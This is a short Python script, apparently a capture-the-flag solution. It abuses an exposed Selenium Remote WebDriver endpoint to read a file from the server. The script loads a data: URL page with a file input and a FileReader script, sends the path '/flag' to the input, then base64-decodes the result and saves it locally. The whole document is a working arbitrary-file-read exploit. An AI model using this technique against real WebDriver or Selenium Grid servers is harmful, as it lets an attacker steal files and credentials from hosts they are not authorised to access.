from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.remote.file_detector import UselessFileDetector
from base64 import b64decode

fpath = "/flag"
lpath = "flag"

options = webdriver.ChromeOptions()
options.add_argument('no-sandbox')
options.add_argument('headless')
selenium = webdriver.Remote(command_executor='http://localhost:12321/wd/hub', desired_capabilities=options.to_capabilities())
selenium.file_detector = UselessFileDetector()

#selenium.get('file:///flag.txt')

selenium.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
selenium.find_element_by_id('f').send_keys(fpath)
content = b64decode(selenium.execute_script('return(inf)').split(',')[1])

with open(lpath,'wb') as f:
    f.write(content)

selenium.quit()
